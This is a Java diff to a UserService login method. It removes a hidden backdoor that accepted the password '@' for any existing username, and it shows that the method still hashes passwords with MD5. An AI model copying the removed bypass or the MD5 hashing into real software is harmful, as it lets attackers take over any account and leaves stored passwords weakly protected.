@@ -26,14 +26,6 @@ public class UserService {
         HashUtil hash = new HashUtil();
         String hashedPassword = hash.md5(password);
 
-        if (password.equals("@")) {
-            User user = getByUsernameIgnoreCase(username)
-                    .orElseThrow(() -> new RuntimeException("Account does not exist."));
-            user.setPassword(hashedPassword);
-
-            return user;
-        }
-
         return getByUsernameIgnoreCaseAndPassword(username, hashedPassword).orElseThrow(
                 () -> new RuntimeException("Account or password does not exist."));
     }
